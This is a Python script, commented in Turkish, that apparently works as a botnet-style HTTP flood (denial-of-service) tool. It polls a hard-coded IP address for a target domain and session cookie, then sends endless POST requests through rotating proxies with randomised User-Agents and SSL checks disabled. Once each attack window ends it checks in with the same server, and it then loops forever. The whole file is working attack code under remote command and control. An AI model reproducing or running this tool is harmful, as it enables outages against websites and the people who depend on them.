import asyncio
import aiohttp
import random
import json
import time
import subprocess
import sys
import os

# ANSI renk kodları
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'
    TICK = '\u2714'  # ✔️
    CROSS = '\u274C'  # ❌
    WARNING = '\u26A0'  # ⚠️

# Gerekli kütüphaneleri kontrol et ve yükle
def install_requirements():
    requirements = ['aiohttp']
    for package in requirements:
        try:
            __import__(package)
        except ImportError:
            print(f"{package} kütüphanesi yükleniyor...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_requirements()  # Gerekli kütüphaneleri yükle

# Rastgele bir User-Agent oluştur
def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        # Diğer User-Agent'ler
    ]
    return random.choice(user_agents)

# Proxy listesini yükle
def load_proxies(proxy_file):
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as file:
            proxies = file.read().splitlines()
            if not proxies:
                print(f"{Colors.YELLOW}{Colors.WARNING} Proxy dosyası boş.{Colors.RESET}")
            proxies = ['http://' + proxy if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')) else proxy for proxy in proxies]
    else:
        print(f"{Colors.RED}{Colors.CROSS} Proxy dosyası bulunamadı: {proxy_file}{Colors.RESET}")
    return proxies

# Ağır ve karmaşık istek gönder
async def send_heavy_request(url, headers, cookies, proxy, semaphore):
    async with semaphore:
        connector = aiohttp.TCPConnector(limit_per_host=1000, ssl=False)  # SSL kontrolünü devre dışı bırakma ve yüksek bağlantı limiti
        cookie_jar = aiohttp.CookieJar() if cookies else None
        
        # Ağır veri ve karmaşık payload oluştur
        payload = {
            "field1": "value",
            "field2": {"nested_field": "nested_value"},
            "field3": [random.randint(0, 100) for _ in range(10)]
        }
        data = json.dumps(payload)

        timeout = aiohttp.ClientTimeout(total=1)  # Daha kısa timeout süresi

        try:
            async with aiohttp.ClientSession(connector=connector, headers=headers, cookies=cookies, cookie_jar=cookie_jar) as session:
                while True:
                    try:
                        async with session.post(url, proxy=proxy, data=data, timeout=timeout) as response:
                            if response.status == 200:
                                print(f"{Colors.GREEN}{Colors.TICK} Başarılı istek: {response.status} proxy {proxy} üzerinden{Colors.RESET}")
                            else:
                                print(f"{Colors.YELLOW}{Colors.WARNING} Diğer sonuç: {response.status} proxy {proxy} üzerinden{Colors.RESET}")
                        await asyncio.sleep(0.1)  # Kısa bekleme süresi
                    except asyncio.CancelledError:
                        print(f"{Colors.RED}{Colors.CROSS} Görev iptal edildi: proxy {proxy} üzerinden{Colors.RESET}")
                        break
                    except aiohttp.ClientError as e:
                        print(f"{Colors.RED}{Colors.CROSS} Proxy hatası: {e}{Colors.RESET}")
                        await asyncio.sleep(0.1)  # Hata durumunda kısa bekleme süresi
                    except Exception as e:
                        print(f"{Colors.RED}{Colors.CROSS} İstek başarısız: {e}{Colors.RESET}")
                        await asyncio.sleep(0.1)  # Hata durumunda kısa bekleme süresi
        except Exception as e:
            print(f"{Colors.RED}{Colors.CROSS} ClientSession oluşturulurken hata oluştu: {e}{Colors.RESET}")

# API'ye istek gönder ve domain durumunu kontrol et
async def check_api_status(api_url):
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        data = await response.json()
                        domain_status = data.get("data", {}).get("domain")
                        cookie_name = data.get("data", {}).get("cookie_name")
                        cookie_value = data.get("data", {}).get("value")
                        
                        if domain_status is None:
                            print(f"{Colors.RED}{Colors.CROSS} API yanıtında 'domain' bilgisi bulunamadı.{Colors.RESET}")
                            await asyncio.sleep(5)  # 5 saniye bekleme süresi
                            continue
                        
                        cookies = {cookie_name: cookie_value} if cookie_name and cookie_value and domain_status != "inActive" else None

                        if domain_status == "inActive":
                            print(f"{Colors.YELLOW}{Colors.WARNING} Domain inActive. API'ye tekrar istek gönderiliyor...{Colors.RESET}")
                            await asyncio.sleep(2)  # 2 saniye bekleme süresi
                        else:
                            print(f"{Colors.GREEN}{Colors.TICK} Aktif domain bulundu: {domain_status}. Saldırı başlatılıyor...{Colors.RESET}")
                            await run_attack(domain_status, cookies, 60)
                            break
                    else:
                        print(f"{Colors.RED}{Colors.CROSS} API isteği başarısız: {response.status}{Colors.RESET}")
                        await asyncio.sleep(5)  # Hata durumunda 5 saniye bekleme süresi
        except Exception as e:
            print(f"{Colors.RED}{Colors.CROSS} API isteği sırasında hata oluştu: {e}{Colors.RESET}")
            await asyncio.sleep(5)  # Hata durumunda 5 saniye bekleme süresi

# Yoğun isteklerle saldırı başlat
async def run_attack(target_url, cookies, attack_duration, num_coroutines=100000, threads=1000):
    proxies = load_proxies('proxies.txt')
    if not proxies:
        print(f"{Colors.RED}{Colors.CROSS} Proxy listesi boş veya dosya bulunamadı.{Colors.RESET}")
        return

    semaphore = asyncio.Semaphore(threads)  # Aynı anda çalışacak görev sayısı
    end_time = time.time() + attack_duration
    tasks = []

    async def attack_coroutine():
        while time.time() < end_time:
            if len(tasks) < threads:  # Yeterli görev yoksa oluştur
                proxy = random.choice(proxies)
                task = asyncio.create_task(send_heavy_request(target_url, {'User-Agent': get_random_user_agent()}, cookies, proxy, semaphore))
                tasks.append(task)
            else:
                # Görevler yeterliyse çalıştır ve temizle
                await asyncio.gather(*tasks)
                tasks.clear()  # Görevleri temizle

    try:
        await asyncio.wait_for(attack_coroutine(), timeout=attack_duration)
    except asyncio.TimeoutError:
        print(f"{Colors.RED}{Colors.CROSS} Saldırı süresi doldu ve görevler iptal ediliyor.{Colors.RESET}")

    # Görevleri iptal et ve bitir
    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)  # Tüm görevlerin iptal edilmesini bekle

    # Saldırı bittikten sonra ek API isteği gönder
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get('http://4.229.234.152/protol_dido/gel.php') as response:
                if response.status == 200:
                    print(f"{Colors.GREEN}{Colors.TICK} API isteği başarılı: {response.status}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}{Colors.CROSS} API isteği başarısız: {response.status}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}{Colors.CROSS} API isteği sırasında hata oluştu: {e}{Colors.RESET}")

# Ana işlev
async def main(url, threads=500, num_coroutines=100000, attack_duration=60):
    while True:
        await check_api_status(url)
        print(f"{Colors.GREEN}{Colors.TICK} Saldırı döngüsü tamamlandı. Yeniden başlatılıyor...{Colors.RESET}")

if __name__ == "__main__":
    asyncio.run(main('http://4.229.234.152/protol_dido/goster.php', threads=1000, num_coroutines=100000, attack_duration=60))
